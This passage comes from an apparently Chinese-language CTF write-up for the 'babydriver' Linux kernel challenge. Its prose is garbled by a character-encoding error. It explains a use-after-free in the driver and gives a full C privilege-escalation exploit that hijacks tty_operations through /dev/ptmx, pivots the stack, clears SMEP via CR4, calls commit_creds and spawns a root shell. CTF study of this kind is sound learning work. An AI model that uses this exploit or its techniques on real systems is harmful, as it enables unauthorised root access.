-s<br></code></pre></div></td></tr></table></figure><ul><li>å¼€å¯äº†SMEPä¿æŠ¤</li></ul><p>è§£å‹ç£ç›˜é•œåƒçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> mkdir core</span><br><span class="hljs-meta">$</span><span class="bash"> cp ./core.cpio ./core</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> core</span><br><span class="hljs-meta">$</span><span class="bash"> cpio -idv &lt; ./core.cpio</span><br></code></pre></div></td></tr></table></figure><p>æŸ¥çœ‹å…¶å¯åŠ¨è„šæœ¬<code>init</code>ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­åŠ è½½äº†ä¸€ä¸ªå«åš<code>babydriver.ko</code>çš„é©±åŠ¨ï¼ŒæŒ‰ç…§æƒ¯ä¾‹è¿™ä¸ªå°±æ˜¯æœ‰ç€æ¼æ´çš„é©±åŠ¨</p><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å…¶åªå¼€äº†NXä¿æŠ¤ï¼Œ<del>æ•´æŒºå¥½</del> </p><p><a href="https://i.loli.net/2021/03/03/eyaFXu2CQ3mwAg4.png"><img src="https://s2.loli.net/2023/02/06/vmYbaP24V6TSokx.png" alt="image.png" style="zoom:50%;" /></a></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>åœ¨é©±åŠ¨è¢«åŠ è½½æ—¶ä¼šåˆå§‹åŒ–ä¸€ä¸ªè®¾å¤‡èŠ‚ç‚¹æ–‡ä»¶<code>/dev/babydev</code></p><p><a href="https://i.loli.net/2021/03/03/pYZeduBDUzfayK9.png"><img src="https://s2.loli.net/2023/02/06/iGPY8DdFmfkRu5I.png" alt="image.png" style="zoom:67%;" /></a></p><p>åœ¨æˆ‘ä»¬ä½¿ç”¨open()æ‰“å¼€è®¾å¤‡æ–‡ä»¶æ—¶è¯¥é©±åŠ¨ä¼šåˆ†é…ä¸€ä¸ªchunkï¼Œ<strong>è¯¥chunkçš„æŒ‡é’ˆå‚¨å­˜äºå…¨å±€å˜é‡</strong><code>babydev_struct</code>ä¸­</p><p><a href="https://i.loli.net/2021/03/03/yvjCraBZLeVb4NG.png"><img src="https://s2.loli.net/2023/02/06/pFMtlAJr7hsgO8R.png" alt="image.png" style="zoom:67%;" /></a></p><p>ä½¿ç”¨<code>ioctl</code>è¿›è¡Œé€šä¿¡åˆ™å¯ä»¥é‡æ–°ç”³è¯·å†…å­˜ï¼Œæ”¹å˜è¯¥chunkçš„å¤§å°</p><p><a href="https://i.loli.net/2021/03/03/Z5sSkiez27yN9EA.png"><img src="https://s2.loli.net/2023/02/06/n5Mbs9IKAU1Lchp.png" alt="image.png" style="zoom:67%;" /></a></p><p>åœ¨å…³é—­è®¾å¤‡æ–‡ä»¶æ—¶ä¼š<strong>é‡Šæ”¾è¯¥chunkï¼Œä½†æ˜¯å¹¶æœªå°†æŒ‡é’ˆç½®NULLï¼Œå­˜åœ¨UAFæ¼æ´</strong></p><p><a href="https://i.loli.net/2021/03/03/ehPoXGFKJ71Dwfl.png"><img src="https://s2.loli.net/2023/02/06/9QLTcPAYyeDChKi.png" alt="image.png" style="zoom:67%;" /></a></p><p>readå’Œwriteå°±æ˜¯ç®€å•çš„è¯»å†™è¯¥chunkï¼Œä¾¿ä¸è´´å›¾äº†</p><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>è‹¥æ˜¯æˆ‘ä»¬çš„ç¨‹åºæ‰“å¼€ä¸¤æ¬¡è®¾å¤‡<code>babydev</code>ï¼Œç”±äºå…¶chunkå‚¨å­˜åœ¨å…¨å±€å˜é‡ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†ä¼šè·å¾—<strong>æŒ‡å‘åŒä¸€ä¸ª chunkçš„ä¸¤ä¸ªæŒ‡é’ˆ</strong></p><p>è€Œåœ¨å…³é—­è®¾å¤‡åè¯¥ chunk è™½ç„¶è¢«é‡Šæ”¾ï¼Œä½†æ˜¯æŒ‡é’ˆæœªç½®0ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥<strong>é€šè¿‡å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ“ä½œè¯¥ chunk</strong>ï¼Œå³<strong>å­˜åœ¨ Use After Free æ¼æ´</strong></p><h3 id="æ¼æ´åˆ©ç”¨ï¼šKernel-UAF-stack-migitation-SMEP-bypass-ret2usr"><a href="#æ¼æ´åˆ©ç”¨ï¼šKernel-UAF-stack-migitation-SMEP-bypass-ret2usr" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼šKernel UAF + stack migitation + SMEP bypass + ret2usr"></a>æ¼æ´åˆ©ç”¨ï¼šKernel UAF + stack migitation + SMEP bypass + ret2usr</h3><p>å†…æ ¸ç¬¦å·è¡¨å¯è¯»ï¼ˆç™½ç»™ï¼‰ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå¾ˆæ–¹ä¾¿åœ°è·å¾—ç›¸åº”å†…æ ¸å‡½æ•°çš„åœ°å€</p><p><a href="https://i.loli.net/2021/08/01/yloiSIGwWN8U1gq.png"><img src="https://s2.loli.net/2023/02/06/dxDr9gRPztAeksH.png" alt="image.png"></a></p><p>æ²¡æœ‰å¼€å¯ kaslrï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä» vmlinux ä¸­æå–gadgetåœ°å€ï¼Œè¿™é‡Œ <strong>ROPgadget å’Œ ropper åŠæ–¤å…«ä¸¤ï¼Œå»ºè®®ä¸¤ä¸ªé…åˆç€ä¸€èµ·ç”¨</strong></p><p>ç”±äºå¼€å¯äº† SMEP ä¿æŠ¤ï¼Œæ— æ³•ç›´æ¥ ret2usrï¼Œæ•…æˆ‘ä»¬éœ€è¦æ”¹å˜ cr4 å¯„å­˜å™¨çš„å€¼ä»¥ bypass smep</p><p>è§‚å¯Ÿåˆ°åœ¨å†…æ ¸ä¸­æœ‰ç€å¦‚ä¸‹çš„ gadget å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ”¹å˜ cr4 å¯„å­˜å™¨çš„å€¼ï¼š</p><p><a href="https://i.loli.net/2021/03/11/rztYCIH579dc6vu.png"><img src="https://s2.loli.net/2023/02/06/gkqITft14bn6rwm.png" alt="image.png" style="zoom:67%;" /></a></p><p>æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•é€šè¿‡ UAF åŠ«æŒç¨‹åºæ‰§è¡Œæµ</p><h4 id="tty-operationsï¼štty-è®¾å¤‡æ“ä½œå…³è”å‡½æ•°è¡¨"><a href="#tty-operationsï¼štty-è®¾å¤‡æ“ä½œå…³è”å‡½æ•°è¡¨" class="headerlink" title="tty_operationsï¼štty è®¾å¤‡æ“ä½œå…³è”å‡½æ•°è¡¨"></a>tty_operationsï¼štty è®¾å¤‡æ“ä½œå…³è”å‡½æ•°è¡¨</h4><p>åœ¨ <code>/dev</code> ä¸‹æœ‰ä¸€ä¸ªä¼ªç»ˆç«¯è®¾å¤‡ <code>ptmx</code> ï¼Œåœ¨æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªè®¾å¤‡æ—¶å†…æ ¸ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>tty_struct</code> ç»“æ„ä½“ï¼Œä¸å…¶ä»–ç±»å‹è®¾å¤‡ç›¸åŒï¼Œttyé©±åŠ¨è®¾å¤‡ä¸­åŒæ ·å­˜åœ¨ç€ä¸€ä¸ªå­˜æ”¾ç€å‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ <code>tty_operations</code> </p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF åŠ«æŒ <code>/dev/ptmx</code> è¿™ä¸ªè®¾å¤‡çš„ <code>tty_struct</code> ç»“æ„ä½“ä¸å…¶å†…éƒ¨çš„ <code>tty_operations</code> å‡½æ•°è¡¨ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬å¯¹è¿™ä¸ªè®¾å¤‡è¿›è¡Œç›¸åº”æ“ä½œï¼ˆå¦‚writeã€ioctlï¼‰æ—¶ä¾¿ä¼šæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„æ¶æ„å‡½æ•°æŒ‡é’ˆ</p><p>ç”±äºæ²¡æœ‰å¼€å¯SMAPä¿æŠ¤ï¼Œæ•…æˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€è¿›ç¨‹çš„æ ˆä¸Šå¸ƒç½®ROPé“¾ä¸<code>fake tty_operations</code>ç»“æ„ä½“</p><blockquote><p>ç»“æ„ä½“<code>tty_struct</code>ä½äº<code>include/linux/tty.h</code>ä¸­ï¼Œ<code>tty_operations</code>ä½äº<code>include/linux/tty_driver.h</code>ä¸­</p></blockquote><p>å†…æ ¸ä¸­æ²¡æœ‰ç±»ä¼¼<code>one_gadget</code>ä¸€ç±»çš„ä¸œè¥¿ï¼Œå› æ­¤ä¸ºäº†å®ŒæˆROPæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡<strong>æ ˆè¿ç§»</strong> </p><p>ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œè§‚å¯Ÿå†…æ ¸åœ¨è°ƒç”¨æˆ‘ä»¬çš„æ¶æ„å‡½æ•°æŒ‡é’ˆæ—¶å„å¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œé€‰æ‹©åŠ«æŒ<code>tty_operaionts</code>ç»“æ„ä½“åˆ°ç”¨æˆ·æ€çš„æ ˆä¸Šï¼Œå¹¶é€‰æ‹©ä»»æ„ä¸€æ¡å†…æ ¸gadgetä½œä¸ºfake ttyå‡½æ•°æŒ‡é’ˆä»¥æ–¹ä¾¿ä¸‹æ–­ç‚¹ï¼š</p><p><a href="https://i.loli.net/2021/03/16/iKBLSsbPT9zcNqQ.png"><img src="https://s2.loli.net/2023/02/06/u5Ma2oVqtbDe6Ls.png" alt="image.png" style="zoom:67%;" /></a></p><p>æˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨<code>tty_operations-&gt;write</code>æ—¶ï¼Œ<strong>å…¶raxå¯„å­˜å™¨ä¸­å­˜æ”¾çš„ä¾¿æ˜¯tty_operationsç»“æ„ä½“çš„åœ°å€</strong>ï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ä¸­æ‰¾åˆ°å½¢å¦‚<code>mov rsp, rax</code>çš„gadgetï¼Œä¾¿èƒ½å¤ŸæˆåŠŸåœ°å°†æ ˆè¿ç§»åˆ°<code>tty_operations</code>ç»“æ„ä½“çš„å¼€å¤´</p><p>ä½¿ç”¨ROPgadgetæŸ¥æ‰¾ç›¸å…³gadgetï¼Œå‘ç°æœ‰ä¸¤æ¡ç¬¦åˆæˆ‘ä»¬è¦æ±‚çš„gadgetï¼š</p><p><a href="https://i.loli.net/2021/03/16/o4c9ryjOBAkit8W.png"><img src="https://s2.loli.net/2023/02/06/hMT1Yq56Fs2cuGE.png" alt="image.png" style="zoom:67%;" /></a></p><p>gdbè°ƒè¯•ï¼Œå‘ç°ç¬¬ä¸€æ¡gadgetå…¶å®ç­‰ä»·äº<code>mov rsp, rax ; dec ebx ; ret</code>ï¼š</p><p><a href="https://i.loli.net/2021/03/16/Qd2sk6TngZa5EDR.png"><img src="https://s2.loli.net/2023/02/06/Ib6pcNPLVtnziSR.png" alt="image.png" style="zoom:67%;" /></a></p><p>é‚£ä¹ˆåˆ©ç”¨è¿™æ¡gadgetæˆ‘ä»¬ä¾¿å¯ä»¥å¾ˆå¥½åœ°å®Œæˆæ ˆè¿ç§»çš„è¿‡ç¨‹ï¼Œæ‰§è¡Œæˆ‘ä»¬æ‰€æ„é€ çš„ROPé“¾</p><p>è€Œ<code>tty_operations</code>ç»“æ„ä½“å¼€å¤´åˆ°å…¶writeæŒ‡é’ˆé—´çš„ç©ºé—´è¾ƒå°ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦è¿›è¡ŒäºŒæ¬¡æ ˆè¿ç§»ï¼Œè¿™é‡Œéšä¾¿é€‰ä¸€æ¡æ”¹raxçš„gadgetå³å¯</p><p><a href="https://i.loli.net/2021/03/16/7bROpernV1lSIjs.png"><img src="https://s2.loli.net/2023/02/06/Oi1EKWaA2M6Inz3.png" alt="image.png" style="zoom:80%;" /></a></p><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>è®¡ç®—ç›¸åº”ç»“æ„ä½“å¤§å°æ—¶åº”å½“é€‰å–ä¸é¢˜ç›®ç›¸åŒç‰ˆæœ¬çš„å†…æ ¸æºç </strong></p><p>æœ€ç»ˆçš„exploitåº”å½“å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">0x20</span>], p = <span class="hljs-number">0</span>;<br>    rop[p++] = POP_RDI_RET;<br>    rop[p++] = <span class="hljs-number">0x6f0</span>;<br>    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = getRootPrivilige;<br>    rop[p++] = SWAPGS_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = IRETQ_RET;<br>    rop[p++] = getRootShell;<br>    rop[p++] = user_cs;<br>    rop[p++] = user_rflags;<br>    rop[p++] = user_sp;<br>    rop[p++] = user_ss;<br><br>    <span class="hljs-keyword">size_t</span> fake_op[<span class="hljs-number">0x30</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;<br><br>    fake_op[<span class="hljs-number">0</span>] = POP_RAX_RET;<br>    fake_op[<span class="hljs-number">1</span>] = rop;<br><br>    <span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>    close(fd1);<br><br>    <span class="hljs-keyword">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-keyword">int</span> fd3 = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>    read(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br>    fake_tty[<span class="hljs-number">3</span>] = fake_op;<br>    write(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br><br>    write(fd3, buf, <span class="hljs-number">0x8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æœ¬åœ°æ‰“åŒ…ï¼Œè¿è¡Œï¼ŒæˆåŠŸææƒåˆ°root</p><blockquote><p>è¿™é“é¢˜åœ¨å½“å¹´çš„è§£æ³•æ®æ‚‰æ˜¯<strong>é€šè¿‡ UAF ä¿®æ”¹è¯¥è¿›ç¨‹çš„ cred ç»“æ„ä½“çš„ uidã€gid ä¸º0</strong>ï¼Œååˆ†ç®€å•ååˆ†ç™½ç»™</p><p>ä½†æ˜¯<strong>æ­¤ç§æ–¹æ³•åœ¨è¾ƒæ–°ç‰ˆæœ¬ kernel ä¸­å·²ä¸å¯è¡Œï¼Œæˆ‘ä»¬å·²æ— æ³•ç›´æ¥åˆ†é…åˆ° cred_jar ä¸­çš„ object</strong>ï¼Œè¿™æ˜¯å› ä¸º cred_jar åœ¨åˆ›å»ºæ—¶è®¾ç½®äº† <code>SLAB_ACCOUNT</code> æ ‡è®°ï¼Œåœ¨ <code>CONFIG_MEMCG_KMEM=y</code> æ—¶ï¼ˆé»˜è®¤å¼€å¯ï¼‰<strong>cred_jar ä¸ä¼šå†ä¸ç›¸åŒå¤§å°çš„ kmalloc-192 è¿›è¡Œåˆå¹¶</strong> </p><blockquote><p>æ¥ç€å†…æ ¸æºç  4.5 <code>kernel/cred.c</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __init <span class="hljs-title">cred_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>    cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(struct cred), <span class="hljs-number">0</span>,<br>            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æœ¬é¢˜ï¼ˆ4.4.72ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __init <span class="hljs-title">cred_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>    cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(struct cred),<br>                     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure></blockquote><blockquote><p>æ—¢ç„¶ç°åœ¨æ–°çš„ä¿æŠ¤æœºåˆ¶éƒ½å‡ºæ¥äº†ï¼Œé‚£ç¬”è€…è®¤ä¸ºåœ¨å­¦ä¹  kernel UAF çš„è¿‡ç¨‹ä¸­å¿½è§†æ‰è¿™ä¸€ç‚¹ä¾¿æ˜¯<strong>è‡ªæ¬ºæ¬ºäºº</strong>ï¼ˆè€Œä¸”è¿™ä¸ªè§£æ³•<strong>å¤ªå¼±æ™ºäº†ï¼Œå®Œå…¨æ²¡æœ‰å­¦çš„æ„ä¹‰</strong> - - 